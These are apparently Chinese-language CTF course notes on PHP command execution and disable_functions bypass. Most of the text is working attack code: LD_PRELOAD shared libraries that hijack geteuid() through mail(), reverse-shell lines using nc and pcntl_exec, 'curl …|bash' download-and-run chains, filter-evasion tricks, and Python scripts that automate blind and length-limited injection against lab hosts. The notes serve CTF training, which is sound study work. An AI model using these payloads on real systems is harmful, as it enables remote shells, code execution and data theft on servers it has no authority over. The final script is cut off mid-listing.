+ 静态链接：在程序运行之前先将各个目标模块以及所需要的库函数链接成一个完整的可执行程序，之后不再拆开

+ 装入时动态链接：源程序编译侯所得到的一组目标模块，再装入内存时，边装入边链接

+ 运行时动态链接模块：源程序编译后得到的目标模块，在程序执行过程中需要用到时才对它进行链接

  对于动态链接来说，需要一个动态链接库，期作用在与当动态库中的函数发生变化对于可执行程序来说是透明的，可执行程序无需重新编译，方便程序的发布/维护/更新

### `LD_PRELOAD`

**修改库文件**

它可以影响程序的运行时的链接（Runtime linker），它运行你定义在程序原型前**优先加载的动态库链接**

这个功能主要就是用来有选择性的载入不同动态链接库中的相同函数

通过这个环境变量，我们可以在主程序和其他动态链接库的中间**加载别的动态链接库**，甚至覆盖正常的函数库

使用自己的或是更好的函数（无需别人的源码）

*_也可以想别人的程序注入恶意程序_*

### 攻击流程

**以`mail()`函数举例**

#### 1. 正常执行文件

源文件

```php
<?php
mail('','','','');   
```

#### 2. 追踪文件的执行

`strace`工具用来检测`demo.php`在执行的过程中还做了哪些系统调用

```php
┌──(root㉿pinginglab)-[/home/pinginglab/php-exec]
└─# strace -o 1.txt -f php demo.php
```

#### 3. 追踪可执行子进程

这里追踪到了一个`sendmail`子进程，

```shell
┌──(root㉿pinginglab)-[/home/pinginglab/php-exec]
└─# grep "exec" 1.txt                 
76377 execve("/usr/sbin/sendmail", ["/usr/sbin/sendmail", "-t", "-i"], 0x5647b3b4fa38 /* 32 vars */ <unfinished ...>
76377 <... execve resumed>)             = 0

```

#### 4. 继续追踪子进程，寻找可利用函数

这里可以发现调用了函数`geteuid()`

```sh
┌──(root㉿pinginglab)-[/home/pinginglab/php-exec]
└─# readelf -Ws /usr/sbin/sendmail
99: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND geteuid@GLIBC_2.2.5 (3)
```

#### 5. 编写脚本，重构`geteuid()`

使用C语言编写库文件

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <assert.h>

void payload(){
    system("echo 'Hacker~~'");
}


int geteuid(){
    unsetenv("LD_PRELOAD");		// 结束调用，防止死循环
    payload();
}
```

`gcc`编译文件

```bash
gcc -shared -fPIC demo.c -o poc.so
```

修改PHP文件

```php
┌──(root㉿pinginglab)-[/home/pinginglab/php-exec]
└─# cat demo.php 
<?php 
// 在程序运行之前先加载 LD_PRELOAD 的共享库
putenv("LD_PRELOAD=./poc.so");
mail('','','','');
```

#### 6. 总结

在执行程序之前，会预先将`LD_PRELOAD`的环境变量设置为`poc.so`，在`mail()`函数的执行过程中，会加载`geteuid()`，由于`getuid()`程序已经被恶意修改，所以达到了攻击的效果

```php
<?php 
putenv("LD_PRELOAD=./poc.so");
mail('','','','');
```

### 绕过条件

1. 能够上传自己的`.so`文件
2. 能够控制环境变量的值（设置`LD_PRELOAD`变量），比如`putenv()`函数并且未被禁止
3. 存在可以控制PHP启动外部程序的函数并能执行（因为新进程启动将加载`LD_PRELOAD`中的`.so`文件），比如`mail()、imal_mail()、mb_send_mail()和error_log()`



## 0x04. `mail()`函数命令执行例题

### 方法一

> 经典方法：但是也是最麻烦的方法

#### 生成库文件

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <assert.h>

void payload(){
    system("cat /flag > fl0g.txt");
}


int geteuid(){
    unsetenv("LD_PRELOAD");		// 结束调用，防止死循环
    payload();
}
```

#### `gcc`编译

```bash
gcc -shared -fPIC demo.c -o poc.so
```

#### 生成PHP文件

```c
<?php 
putenv("LD_PRELOAD=./poc.so");
mail('','','','');
```

#### 客户端访问测试

成功在当前路径中的`fl0g.txt`文件得到flag

### 方法二

> 最简单和最方便的方法，通过反弹shell得到命令执行权限

#### 生成库文件

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <assert.h>

int geteuid(){
    unsetenv("LD_PRELOAD");
    system("nc 192.168.231.129 7777 -e /bin/bash");
}
```

#### `gcc`编译

```bash
┌──(root㉿pinginglab)-[/home/pinginglab/php-exec/resource]
└─# gcc -shared -fPIC demo2.c -o demo2.so
```

#### 生成PHP文件

```php
<?php
putenv("LD_PRELOAD = ./demo2.so");
mail('','','','');
```

#### 客户端访问测试

成功会弹shell

<img src="%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230814001110822.png" alt="image-20230814001110822" style="zoom:50%;" />

### 方法三

> 最复杂的方法，通过变量来指定要执行的命令

#### 生成库文件

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <assert.h>

int geteuid() {
    // 生成指针变量 cmdline，值是 环境变量EVIL_CMDLINE 中的值
    const char *cmdline = getenv("EVIL_CMDLINE");
    // 如果 LD_PRELOAD 为 NULL，则直接返回0，否则取消调用
    if (getenv("LD_PRELOAD") == NULL) {
        return 0;
    }
    unsetenv("LD_PRELOAD");
    // 执行命令
    system(cmdline);
}
```

#### `gcc`编译

```bash
┌──(root㉿pinginglab)-[/home/pinginglab/php-exec/resource]
└─# gcc -shared -fPIC demo1.c -o demo1.so
```

#### 生成PHP文件

```php
<?php
// 获取要执行的命令
$cmd = $_REQUEST['cmd'];
// 获取命令执行结果的输出路径
$out_path = $_REQUEST['out_path'];

// 拼接命令
// 2>&1 将 标准输出和错误输出 都输出出来
$evil_cmdline = $cmd. " > ".$out_path." 2>&1";
echo "<br/><b>cmdline：</b>".$evil_cmdline;
// 设置变量 EVIL_CMDLINE
putenv("EVIL_CMDLINE=".$evil_cmdline);

// 获取 so文件 的路径
$so_path = $_REQUEST['sopath'];
// 指定库文件
putenv("LD_PRELOAD=".$so_path);
mail('','','','');
echo "<br/><b>output：</b><br/>".file_get_contents($out_path);
```

#### 客户端测试

```
HTTP payload
?cmd=cat%20/flag&out_path=flag.txt&sopath=./demo1.so
```

<img src="%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230814001725273.png" alt="image-20230814001725273" style="zoom:50%;" />

## 0x05. 蚁剑及`pcntl`绕过函数过滤

### 使用蚁剑插件绕过函数过滤

> Disable_function 插件的使用只能在Linux系统上运行

#### 1. Linux 蚁剑安装

```
Github 下载链接
https://github.com/AntSwordProject/AntSword-Loader
```

#### 2. 插件下载与安装

将插件下载之后解压缩到`antSword-master/antData/plugins`目录中即可

```
链接：https://pan.baidu.com/s/17DvmXiTV9gcTw8fbqurUaQ?pwd=xx66 
提取码：xx66
```

#### 3. 插件的使用

<img src="%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230814160509828.png" alt="image-20230814160509828" style="zoom: 67%;" />



<img src="%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230814160525394.png" alt="image-20230814160525394" style="zoom: 80%;" />

### `pcntl_exec`函数

#### 1. 函数的使用

```
pcntl_exec ( string `$path` [, array `$args` [, array `$envs` ]] ) : void
```

- `path`

  `path`必须时可执行二进制文件路径或一个在文件第一行指定了 一个可执行文件路径标头的脚本（比如文件第一行是#!/usr/local/bin/perl的perl脚本）。 更多的信息请查看您系统的execve（2）手册。

- `args`

  `args`是一个要传递给程序的参数的字符串数组。

- `envs`

  `envs`是一个要传递给程序作为环境变量的字符串数组。这个数组是 key => value格式的，key代表要传递的环境变量的名称，value代表该环境变量值。

##### 返回值

当发生错误时返回 **`FALSE`** ，没有错误时没有返回。

#### 2. 回弹`webshell`

##### 例题源码

```php
ini_set('open_basedir', '/www/admin/localhost_81/wwwroot/class02' . $dir);
error_reporting(0);
if(isset($_POST['cmd'])){
    $cmd = $_POST['cmd'];
    if($cmd)
    {
        eval($cmd);
    }
    else{
        echo "给你留个后门又能怎样？能拿到我根目录下的flag么？";
    }
}
```

##### payload

```
cmd=pcntl_exec("/bin/bash", array("-c", "nc 192.168.231.129 7777 -e /bin/bash"));
```

## 0x06. 命令拼接符

### `;`

使多个命令顺序执行

前面的命令和后面的命令都会执行

```bash
┌──(pinginglab㉿pinginglab)-[~]
└─$ whoami;id                                                                                     
pinginglab
用户id=1000(pinginglab) 组id=1000(pinginglab) 组=1000(pinginglab),4(adm),20(dialout),24(cdrom),25(floppy),27(sudo),29(audio),30(dip),44(video),46(plugdev),109(netdev),121(wireshark),126(bluetooth),138(scanner),146(kaboxer),148(docker)
```

### `&`

是命令在后台运行

这样就可以同时执行多条命令

**若在前端提交，必须进行URL编码****

```bash
┌──(pinginglab㉿pinginglab)-[~]
└─$ whoami&id
[1] 23116
pinginglab
[1]  + done       whoami
用户id=1000(pinginglab) 组id=1000(pinginglab) 组=1000(pinginglab),4(adm),20(dialout),24(cdrom),25(floppy),27(sudo),29(audio),30(dip),44(video),46(plugdev),109(netdev),121(wireshark),126(bluetooth),138(scanner),146(kaboxer),148(docker)
```

### `&&`

如果前面的命令成功执行，则执行后面的命令

```bash
┌──(pinginglab㉿pinginglab)-[~]
└─$ whoami&&id
pinginglab
用户id=1000(pinginglab) 组id=1000(pinginglab) 组=1000(pinginglab),4(adm),20(dialout),24(cdrom),25(floppy),27(sudo),29(audio),30(dip),44(video),46(plugdev),109(netdev),121(wireshark),126(bluetooth),138(scanner),146(kaboxer),148(docker)                                                                     
```

### `|`

管道符，将前面命令的标准输出做标准输入到后面的命令

```bash
┌──(pinginglab㉿pinginglab)-[~]
└─$ echo 'whoami' | /bin/bash 
pinginglab
```

### `||`

短路运算：前面的命令成功执行则不执行后面的命令

```bash
┌──(pinginglab㉿pinginglab)-[~]
└─$ whoami || ls
pinginglab
```

## 0x07. 空格绕过

### 1. 大括号

使用大括号将命令拼接起来，并使用`,`分割

`{cat,flag.txt}`

### 2. `$IFS`代替空格

```
$IFS、${IFS}、$IFS$9
```

Linux 下有一个特殊的环境变量叫做IFS，叫做内部分隔符（internal field separator）

```
cat$IFS/flag
```

单纯`$IFS2`被`bash`解释器当作变量名，输不出结果，加一个`{}`就固定了变量名

```
cat${IFS}/flag
```

`$IFS$9` - 后面加个`$`与`{}`类似，起截断作用，$9是当前系统shell进程第9个参数持有者，始终为空字符

```bash
cat$IFS$9/flag
```

### 3. 重定向字符`<`,`<>`

`<`表示的是输入重定向的意思，就是把`<`后面跟的文件取代键盘作为新的输入设备

```bash
# 将 /flag.txt 标准输入到 cat 中
┌──(pinginglab㉿pinginglab)-[~]
└─$ cat</flag.txt  
Flag is this
```

```bash
┌──(root㉿pinginglab)-[/home/pinginglab]
└─# cat <>/flag.txt
Flag is this
```

### 4. URL编码

**%09(Tab)**

```bash
cat%09/flag
```

**%20(Tab)**

```
cat%20/flag
```

## 0x08. 文件名过滤绕过

### 1. 通配符绕过

使用通配符 `* | ?` 来绕过

其中，`*`代表所有，`?`代表一个字符

```bash
# 查看文件 /flag.txt
┌──(root㉿pinginglab)-[/home/pinginglab]
└─# cat /f*                               
Flag is this

┌──(root㉿pinginglab)-[/home/pinginglab]
└─# cat /f???????
Flag is this
```

### 2. 单引号、双引号绕过

Linux 中在命令中间插入单引号或双引号都可以继续执行命令

```bash
┌──(root㉿pinginglab)-[/home/pinginglab]
└─# cat /fl''ag.t""xt
Flag is this
```

### 3. 反斜杠绕过

Linux 中的反斜杠代表转义字符

```bash
# \a 在 Linux 中并没有特殊含义，所以依然当字母a来处理
┌──(root㉿pinginglab)-[/home/pinginglab]
└─# cat /fl\ag.txt 
Flag is this
```

### 4. 使用 `$1-9`，`$a,$*`等

```bash
┌──(root㉿pinginglab)-[/home/pinginglab]
└─# cat /fl$@ag.txt
Flag is this
                                                                                                                                                    
┌──(root㉿pinginglab)-[/home/pinginglab]
└─# cat /fl$@*g.txt
Flag is this

┌──(root㉿pinginglab)-[/home/pinginglab]
└─# cat /fl$5ag.txt
Flag is this
```

### 5. 内联执行

通过定义变量的方式来绕过安全过滤

```bash
┌──(root㉿pinginglab)-[/home/pinginglab]
└─# a=/fl;b=ag;c=.t;d=xt;cat $a$b$c$d
Flag is this
```

### 6. 利用 Linux 中的环境变量

通过对 Linux 中的环境变量进行字符切片从而拼接成所需要的字符串

```bash
┌──(root㉿pinginglab)-[/home/pinginglab]
└─# echo $PATH                
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/local/games:/usr/games

┌──(root㉿pinginglab)-[/home/pinginglab]
└─# echo f${PATH:5:1}${PATH:8:1}g 
flag
```

## 0x09. 常见文件读取命令绕过

### 1. `tac`：方向显示

将文件以行为单位反向显示

```bash
┌──(root㉿pinginglab)-[/home/pinginglab]
└─# tac php-exec/demo.php 
mail('','','','');
putenv("LD_PRELOAD=./poc.so");
<?php
```

### 2. `more`：一页一页的显示

```bash
┌──(root㉿pinginglab)-[/home/pinginglab]
└─# more /flag.txt
```

### 3. `less`：与`more`类似

```bash
┌──(root㉿pinginglab)-[/home/pinginglab]
└─# less /flag.txt
```

### 4. `tail`：查看末尾几行

```bash
┌──(root㉿pinginglab)-[/home/pinginglab]
└─# tail /flag.txt       
Flag is this
```

### 5. `nl`：显示的时候，顺便输出行号

```bash
┌──(root㉿pinginglab)-[/home/pinginglab]
└─# nl /flag.txt 
     1  Flag is this
```

### 6. `od`：以二进制的方式读取档案内容

```bash
┌──(root㉿pinginglab)-[/home/pinginglab]
└─# od /flag.txt 
0000000 066106 063541 064440 020163 064164 071551 000012
0000015
```

### 7. `xxd`：读取二进制文件

```bash
┌──(root㉿pinginglab)-[/home/pinginglab]
└─# xxd /flag.txt 
00000000: 466c 6167 2069 7320 7468 6973 0a         Flag is this.
```

### 8. `sort`：主要用于排序文件

```bash
┌──(root㉿pinginglab)-[/home/pinginglab]
└─# sort /flag.txt               
Flag is this
```

### 9. `uniq`：包裹或删除文件中重复的行

```bash
┌──(root㉿pinginglab)-[/home/pinginglab]
└─# uniq /flag.txt 
Flag is this
```

### 10. `file -f`：报错出具体内容

文件中以行为单位打开文件

```bash
┌──(root㉿pinginglab)-[/home/pinginglab]
└─# file -f /flag.txt 
Flag is this: cannot open `Flag is this' (No such file or directory)
```

### 11. `grep`：在文本中过滤出所需字符串

```bash
┌──(root㉿pinginglab)-[/home/pinginglab]
└─# grep "f*" /f*                        
Flag is this	
```

## 0x10. 编码绕过

### 0. 例题代码

```php
<?php
header("content-type:text/html;charset=utf-8");
highlight_file(__FILE__);
error_reporting(0);
if(isset($_GET['cmd'])) {
    $cmd = $_GET['cmd'];
    if (!preg_match("/flag|php|cat|sort|shell/i", $cmd)) {
        eval($cmd);
    }
    else{
        echo "再来黑我丫！！！";
    }
}
```

### 1. `base64`编码绕过

**反引号的作用**

Linux 中的反引号的作用：将反引号中的命令输出，作为另一个命令的参数

```bash
# 通过 echo 输出文件名作为 cat 命令的参数
┌──(root㉿pinginglab)-[/home/pinginglab]
└─# cat `echo /flag.txt`                  
Flag is this
```

反引号的使用一定需要搭配`echo`来执行

```bash
┌──(root㉿pinginglab)-[/home/pinginglab]
└─# `echo Y2F0IC9mbGFnLnR4dAo= |base64 -d` 
Flag is this

# 也可以通过重定向到 /bin/bash 来执行命令
┌──(root㉿pinginglab)-[/home/pinginglab]
└─# echo "Y2F0IC9mbGFnLnR4dAo=" |base64 -d | /bin/bash
Flag is this

# 也可以使用 $(...) 的方式执行代码
┌──(root㉿pinginglab)-[/home/pinginglab]
└─# $(echo Y2F0IC9mbGFnLnR4dAo= |base64 -d)        
Flag is this
```

### 2. `base32`编码绕过

与`base64`编码绕过一样，只不过将算法换成了`base32`

```bash
# 反引号执行
┌──(root㉿pinginglab)-[/home/pinginglab]
└─# `echo MNQXIIBPMZWGCZZOOR4HICQ= |base32 -d`
Flag is this

# 管道重定向到新的 shell
┌──(root㉿pinginglab)-[/home/pinginglab]
└─# echo MNQXIIBPMZWGCZZOOR4HICQ= |base32 -d |/bin/bash
Flag is this

# 也可以使用 $(...) 的方式执行代码
┌──(root㉿pinginglab)-[/home/pinginglab]
└─# $(echo MNQXIIBPMZWGCZZOOR4HICQ= |base32 -d)        
Flag is this
```

### 3. `HEX`编码绕过

```bash
# 使用 Linux 对字符串做 HEX 运算
# -ps 以纯文本16进制的形式输出
┌──(root㉿pinginglab)-[/home/pinginglab]
└─# echo "cat /flag.txt" |xxd -ps                      
636174202f666c61672e7478740a

# 使用 编码转换 的方式执行命令
┌──(root㉿pinginglab)-[/home/pinginglab]
└─# echo "636174202f666c61672e7478740a" |xxd -r -p |/bin/bash
Flag is this
```

### 4. `shellcode`编码

```bash
┌──(pinginglab㉿pinginglab)-[~]
└─$ echo "\x63\x61\x74\x20\x2f\x66\x6c\x61\x67\x2e\x74\x78\x74" |/bin/bash
Flag is this
```

### 5. 编码转换脚本

```python
import binascii

# 要转换的字符串
string = "cat /flag.txt"

hex_string = binascii.hexlify(string.encode()).decode()
print('HEX 编码：', hex_string)

res = ''
for i in range(0, len(hex_string), 2):
    res += '\\x' + hex_string[i] + hex_string[i + 1]

print("shell code编码：", res)
```

## 0x10. 无回显盲注

### 例题代码

```php
<?php
error_reporting(0);
function check($x){
    if(preg_match('/\\$|\!|\@|\#|\%|\^|\&|\*|\?|\>|\<|nc|wget|exec|bash|sh|netcat|grep|base64|rev|curl|wget|gcc|python|pingtouch|mv|mkdir|cp/i', $x)){
        die('too young too simple sometimes naive!');
    }
}
if(isset($_GET['cmd'])){
    $cmd=$_GET['cmd'];
    check($cmd);
    exec($cmd);
}
else{
    highlight_file(__FILE__);
}
?>
```

### 前置知识

#### 1. `awk NR==N`：查询指定行

```bash
# awk NR==2：指定查询第二行的内容
┌──(pinginglab㉿pinginglab)-[~]
└─$ cat -n base.txt| awk NR==2 
     2  is
```

#### 2. `cut -c`：查询指定列的字符

```bash
┌──(pinginglab㉿pinginglab)-[~]
└─$ cat base.txt| cut -c 1 
f
i
t
h
h
h
```

#### 3. 组合查询指定行的第N个字符

```bash
# 查询第一行的第一个字符
┌──(pinginglab㉿pinginglab)-[~]
└─$ cat base.txt| awk NR==1 |cut -c 1
f

# 查询第二行的第二个字符
┌──(pinginglab㉿pinginglab)-[~]
└─$ cat base.txt| awk NR==2 |cut -c 2
s
```

#### 4. `IF`语句

由于在Linux中，`<`，`>`字符被用于重定向，所以需要用其他字符来代替

```
-gt（大于）、-lt（小于）、-ge（大于等于）和 -le（小于等于）
```

```bash
# 格式
if [ 条件表达式 ];then True分支;fi

# 3>2，指定命令
# 注意在 [] 中，所有字符都需要有一个空格隔开
┌──(pinginglab㉿pinginglab)-[~]
└─$ if [ 3 -gt 2 ];then echo 'yes';fi
yes
```

#### 5. `sleep`：睡眠

```bash
# 睡眠3秒
┌──(pinginglab㉿pinginglab)-[~]
└─$ sleep 3  
```

#### 6. 组合使用

```bash
# 如果文件中的第一个字符为f就 sleep 2秒
┌──(pinginglab㉿pinginglab)-[~]
└─$ if [ $(cat base.txt| awk NR==1| cut -c 1) == 'f' ];then sleep 2;fi

# 如果文件中的第三行第一个字符是 t 就 sleep 2秒
┌──(pinginglab㉿pinginglab)-[~]
└─$ if [ $(cat base.txt |awk NR==3| cut -c 1) == 't' ];then sleep 2;fi
```

### Python盲注脚本

```py
# 我写的
import requests
import time

base_url = "http://192.168.231.129:18080/class08/1.php?cmd="

# if [ $(cat base.txt| awk NR==2 |cut -c 2) == s ];then echo "yes";fi
res = ''
# 多少行
for row in range(1, 10):
    # 多少字符
    for cut_char in range(1, 50):
        # ASCII 码爆破范围
        for ascii_char in range(32, 128):
            # time.sleep(0.5)
            char = chr(ascii_char)
            # payload = f"if [ `cat /flag |awk NR=={row} | cut -c {cut_char}` == {char} ];then sleep 2;fi"
            payload = f"if [ `cat flag.php | awk NR=={row} | cut -c {cut_char}` == {ascii_char} ];then sleep 2;fi"
            url = base_url + payload
            # print(url)
            try:
                print("发送：", end='')
                req = requests.get(url, timeout=1).text
                print(req)
            except Exception as e:
                print("获得字符：",char)
                res += char
                break
print(res)

# 课程给的
import requests
import time
url = "http://192.168.1.6:19080/class08/1.php"
result = ""
for i in range(1,5):
    for j in range(1,55):
        #ascii鐮佽〃
        for k in range(32,128):
            k=chr(k)
            #time.sleep(0.1)
            payload = "?cmd=" + f"if [ `cat flag.php | awk NR=={i} | cut -c {j}` == {k} ];then sleep 2;fi"
            try:
                requests.get(url=url+payload, timeout=(1.5,1.5))
            except:
                result = result + k
                print(result)
                break
    result += " "
```

## 0x11. 长度绕过前置知识

### 1. 命令换行执行

```bash
# \ 可以使命令换行执行
┌──(root㉿pinginglab)-[/home/pinginglab/php-exec/xyz]
└─# ca\ 
> t\            
>  flag
ctuctf={awsduhwiquhduiqwbfiu}
```

### 2. `ls -t`：按时间排序显示

将文件名按时间排序来显示，**从最近--->最远**，单位为秒

```bash
┌──(root㉿pinginglab)-[/home/pinginglab/php-exec/xyz]
└─# ls -t    
 x  'cat \'  'fla\'   g   flag
```

### 3. `>`创建文件

可以使用重定向输出创建文件

```bash
# 一般用法
┌──(root㉿pinginglab)-[/home/pinginglab/php-exec/xyz]
└─# echo "ctuctf={awsduhwiquhduiqwbfiu}" > flag 

# 也可以直接当 touch 使用
┌──(root㉿pinginglab)-[/home/pinginglab/php-exec/xyz]
└─# >fla\\
>
^C  
                                                                                                                                                    
┌──(root㉿pinginglab)-[/home/pinginglab/php-exec/xyz]
└─# ls
'fla\'   flag   g
```

### 4. 执行文件

#### `sh`：执行命令

**sh命令** 是shell命令语言解释器，执行命令从标准输入读取或从一个文件中读取

```shell
bash [options] [file]
```

**sh命令** 执行命令**不需要文件有执行权限**，推荐使用这种方法

```bash
┌──(root㉿pinginglab)-[/home/pinginglab/php-exec/xyz]
└─# sh x
x: 1: x: not found
ctuctf={awsduhwiquhduiqwbfiu}
x: 5: flag: not found
```

#### `./filename`：执行命令

要求文件有执行权限

```bash
┌──(root㉿pinginglab)-[/home/pinginglab/php-exec/xyz]
└─# ./x
./x: 1: x: not found
ctuctf={awsduhwiquhduiqwbfiu}
./x: 5: flag: not found
```

### 5. 组合使用

#### 思路

1. 利用`>`来创建文件，减少命令长度
2. 利用`\`来切割命令
3. `ls -t`，按时间将文件名来排序，最后使用`>`写入执行文件

#### 实战流程

```bash
┌──(root㉿pinginglab)-[/home/pinginglab/php-exec/xyz]
└─# >g    
^C
                                                                                                                                                    
┌──(root㉿pinginglab)-[/home/pinginglab/php-exec/xyz]
└─# >fla\\
>
^C  
                                                                                                                                                    
┌──(root㉿pinginglab)-[/home/pinginglab/php-exec/xyz]
└─# ls
'fla\'   flag   g
                                                                                                                                                    
┌──(root㉿pinginglab)-[/home/pinginglab/php-exec/xyz]
└─# >cat\ \\
^C                                                                                                                                                                                                                                                
┌──(root㉿pinginglab)-[/home/pinginglab/php-exec/xyz]
└─# ls -t > x
                                                                                                                                                    
┌──(root㉿pinginglab)-[/home/pinginglab/php-exec/xyz]
└─# sh x
x: 1: x: not found
ctuctf={awsduhwiquhduiqwbfiu}
x: 5: flag: not found
```

### `dir`命令

`dir`会在`ls -t`的基础上做不换行输出

```bash
┌──(root㉿pinginglab)-[/home/pinginglab/php-exec/xyz]
└─# dir                                   
cat\ \\  fla\\  flag  g  x
                                                                                                                                                                                   
┌──(root㉿pinginglab)-[/home/pinginglab/php-exec/xyz]
└─# dir > z
                                                                                                                                                    
┌──(root㉿pinginglab)-[/home/pinginglab/php-exec/xyz]
└─# cat z
cat\ \\  fla\\  flag  g  x  z
```

**`$(dir*)`**会将两个文件名拼接成一条命令，其中第一个文件名为命令，第二个文件名为参数

```bash
┌──(root㉿pinginglab)-[/home/pinginglab/php-exec/xyz]
└─# dir    
cat  flag

┌──(root㉿pinginglab)-[/home/pinginglab/php-exec/xyz]
└─# $(dir *)                                   
ctuctf={awsduhwiquhduiqwbfiu}
```

### `rev`反向输出文件内容

```bash
┌──(root㉿pinginglab)-[/home/pinginglab/php-exec/xyz]
└─# rev flag                               
}uifbwqiudhuqiwhudswa{=ftcutc
```

## 0x12. 长度为7限制绕过

### 例题代码

```php
<?php
highlight_file(__FILE__);
error_reporting(E_ALL);
function filter($argv){
    $a = str_replace("/\*|\?|/","=====",$argv);
    return $a;
}
if (isset($_GET['cmd']) && strlen($_GET['cmd']) <= 7) {
    exec(filter($_GET['cmd']));
} else  {
    echo "flag in local path flag file!!";
}
```



利用前置知识，将命做为文件名分为多断写入，最后使用命令`ls -t>y`，写入文件，使用`sh y`执行命令

注意：由于`ls -t`会以时间由近及远的方式写入，所以需要将命令倒着写入

### POC代码

```py
import requests

base_url = 'http://192.168.231.129:18080/class09/2/index.php?cmd='

if __name__ == '__main__':
    # 要执行命令：
    # cat flag|nc 192.168.231.129 7777
    # ls -t>a
    # sh a
    payload_list = ['>7777', '>29\ \\\\', '>1.1\\\\', '>23\\\\', '>68.\\\\', '>2.1\\\\', '>19\\\\',
                    '>nc\ \\\\', '>g\|\\\\', '>fla\\\\', '>t\ \\\\', '>ca\\\\', 'ls -t>a', 'sh a']
    rst = ''
    for i in payload_list:
        rst += ' ' + i
        print("发送：", rst)
        res = requests.get(base_url + i).text
        # print(res)
```

## 0x13. 长度为5限制绕过

### 例题代码

```php
<?php
highlight_file(__FILE__);
error_reporting(E_ALL);
function filter($argv){
    $a = str_replace("/\*|\?|/","=====",$argv);
    return $a;
}
if (isset($_GET['cmd']) && strlen($_GET['cmd']) <= 5) {
    exec(filter($_GET['cmd']));
} else  {
    echo "flag in local path flag file!";
}
```



在`0x12`的基础上改进：

1. `ls -t>y`超过了5个字符，所以这种方法不可取；延申长度为7的绕过思路，使用`ls>y`命令，将`ls -t>y`的命令截断写入文件，最后执行

   1. 这里有一个窍门，因为`ls`排序的问题，所以我们需要先将`ls\\`写入文件中

   2. 写入顺序如下：

   3. ```bash
      # 先将 ls\ 创建出来并写入，后续追加就能得到想要的效果
      >ls\\
      ls>_
      >\ \\
      >-t\\
      >\>y
      ls>>_
      
      root@281fa67f68cc:/www/admin/localhost_80/wwwroot/class09/3# cat _
      _
      backup
      flag
      index.php
      # 这里组成了一段完整的命令
      # ---------------
      ls\
       \
      -t\
      >y
      _
      # ---------------
      backup
      flag
      index.php
      ls
      ```

### POC代码

由于需要通过`curl`的方式来执行`nc`以获取`webshell`，所以这里需要先开启Web服务

```bash
import requests
import time

base_url = 'http://192.168.231.129:18080/class09/3/index.php?cmd='

if __name__ == '__main__':
    # 写入命令1：ls -t>x
    payload_list1 = ['>ls\\\\', 'ls>_', '>\\ \\\\', '>-t\\\\', '>\\>y', 'ls>>_']
    # 写入命令2：curl 192.168.231.129|bash
    payload_list2 = [">bash", ">\\|\\\\", ">29\\\\", ">1\\\\", ">1.\\\\", ">23\\\\", ">8.\\", ">16\\", ">2.\\", ">19\\", ">\ \\",">rl\\", ">cu\\"]

    rst = ''
    for i in payload_list1:
        rst += ' ' + i
        print("长度：", len(rst), '-----', rst)
        res = requests.get(base_url + i).text

    rst = ''
    for j in payload_list2:
        rst += ' ' + j
        print("长度：", len(rst), '-----', rst)
        res = requests.get(base_url + j).text

    requests.get(base_url + "sh _")
    requests.get(base_url + "sh y")
```

## 0x14. 长度为4限制绕过

### 例题代码

```php
<?php
highlight_file(__FILE__);
error_reporting(E_ALL);
function filter($argv){
    str_replace("/\?|/","=====",$argv);
    return $argv;
}
if (isset($_GET['cmd']) && strlen($_GET['cmd']) <= 4) {
    exec(filter($_GET['cmd']));
} else  {
    echo "flag in local path flag file!";
}
```

### 思路分析

由于长度的限制为4，所以`ls>>a`超过了规定长度，无法构造出所需命令`ls -t`

可以使用**`*`**进行绕过，作用相等于`$(dir)`，将第一个文件名当作命令，后续的文件名当作参数

```bash
┌──(pinginglab㉿pinginglab)-[~/php-exec/xyz]
└─$ ls             
cat  flag
       
# 执行了命令：cat flag
┌──(pinginglab㉿pinginglab)-[~/php-exec/xyz]
└─$ *
hahaha
```

### payload 构造分析

**构造思路：**利用`* = $(dir)`的特点，执行`dir`命令，为了保证字符的顺序，这里使用倒序，最后使用命令`rev`进行排序

```bash
# 先构造一个 ; 来截断命令，防止后面有其他字符干扰命令执行
root@281fa67f68cc:/www/admin/localhost_80/wwwroot/class09/4# >g\;
# 倒序构造命令
root@281fa67f68cc:/www/admin/localhost_80/wwwroot/class09/4# >g\>
# 由于 t 的排序靠后，无法组成完整顺序，所以这里使用 h 把排序往前拉
root@281fa67f68cc:/www/admin/localhost_80/wwwroot/class09/4# >ht-
root@281fa67f68cc:/www/admin/localhost_80/wwwroot/class09/4# >sl
# 创建文件 dir，以便使用 * 执行
root@281fa67f68cc:/www/admin/localhost_80/wwwroot/class09/4# >dir
# 这里等于 dir>v
root@281fa67f68cc:/www/admin/localhost_80/wwwroot/class09/4# *>v
root@281fa67f68cc:/www/admin/localhost_80/wwwroot/class09/4# cat v
ffff.php  flag  g;  g>  ht-  sl

zackup:
ffff.php  flag

# 创建文件 rev
root@281fa67f68cc:/www/admin/localhost_80/wwwroot/class09/4# >rev
root@281fa67f68cc:/www/admin/localhost_80/wwwroot/class09/4# ls
 dir   ffff.php   flag  'g;'  'g>'   ht-   rev   sl   v   zackup
# 这里等于 rev v>x
# 这里之所以能匹配到 rev 而不是 div，可能是因为命令是：*v>x，而不是：*>x，因为 div 不需要参数
root@281fa67f68cc:/www/admin/localhost_80/wwwroot/class09/4# *v>x
# 成功构造出 ls -th g
root@281fa67f68cc:/www/admin/localhost_80/wwwroot/class09/4# cat x
ls  -th >g  ;g  galf  php.ffff

:pukcaz
galf  php.ffff

# 最后使用同样的方法构造出命令：curl 0xC0A8E781|bash
```

### POC代码

```py
import requests
import time

base_url = 'http://192.168.231.129:18080/class09/4/ffff.php?cmd='

if __name__ == '__main__':
    # 文件 v 用于存储 dir 输出的内容
    # 文件 x 用于将文件 v 的内容进行倒序
    # 写入命令1：ls -t>x
    payload_list1 = ['>g\;', '>g\>', '>ht-', '>sl', '>dir', '*>v', '>rev', '*v>x']
    # 写入命令2：curl 192.168.231.129|bash
